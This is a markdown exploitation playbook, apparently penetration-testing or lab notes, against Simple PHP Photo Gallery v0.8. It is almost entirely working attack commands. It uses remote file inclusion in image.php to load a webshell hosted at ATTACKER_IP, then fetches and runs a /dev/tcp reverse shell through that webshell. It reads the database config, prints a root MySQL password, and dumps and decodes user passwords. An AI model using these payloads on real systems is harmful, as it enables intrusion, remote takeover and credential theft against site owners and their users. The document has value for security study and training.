# Simple PHP Photo Gallery

Simple PHP Photo Gallery `v0.8` on Apache/PHP can allow remote file inclusion through `image.php`, leading to command execution as the web server user.

## Discovery

Useful indicators:

```text
80/tcp open  http  Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Simple PHP Photo Gallery
```

WhatWeb may show:

```text
Apache[2.4.6], PHP[5.4.16], Title[Simple PHP Photo Gallery], X-Powered-By[PHP/5.4.16]
```

The application version can appear on the main page:

```text
Simple PHP Photo Gallery v0.8
```

## RFI to Webshell

Host a PHP webshell:

```bash
cp /usr/share/webshells/php/simple-backdoor.php .
sudo python3 -m http.server 80
```

Trigger the RFI through the `img` parameter:
Other versions the RFI is in the `i` parameter:
```bash
curl "http://TARGET/image.php?img=http://ATTACKER_IP/simple-backdoor.php&cmd=id"
curl "http://TARGET/image.php?i=http://ATTACKER_IP/simple-backdoor.php&cmd=id"
```

Successful command execution:

```text
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

## Reverse Shell

Create a shell script:

```bash
cat > shell.sh <<'EOF'
#!/bin/bash
sleep 20
sh -i >& /dev/tcp/ATTACKER_IP/80 0>&1
EOF
sudo python3 -m http.server 80
```

Fetch and execute it through the RFI webshell:

```bash
curl "http://TARGET/image.php?img=http://ATTACKER_IP/simple-backdoor.php&cmd=wget+-O+/tmp/shell.sh+http://ATTACKER_IP/shell.sh"
curl "http://TARGET/image.php?img=http://ATTACKER_IP/simple-backdoor.php&cmd=chmod+777+/tmp/shell.sh"
curl "http://TARGET/image.php?img=http://ATTACKER_IP/simple-backdoor.php&cmd=/tmp/shell.sh"
```

Because the shell script sleeps before connecting back, stop the HTTP server after triggering it and start the listener on the same port:

```bash
sudo nc -nlvp 80
```

## Database Credentials

Read the gallery database config:

```bash
curl "http://TARGET/image.php?img=http://ATTACKER_IP/simple-backdoor.php&cmd=cat+db.php"
```

Useful values:

```php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
```

If remote MySQL denies the attacker host, use the credentials locally from the web shell:

```bash
mysql -u root -h 127.0.0.1 -p
```

Dump the gallery users:

```sql
use SimplePHPGal;
show tables;
select * from users\G
```

Observed passwords were base64 encoded twice:

```bash
echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d
echo 'SG9ja1N5ZG5leUNlcnRpZnkxMjM=' | base64 -d
```


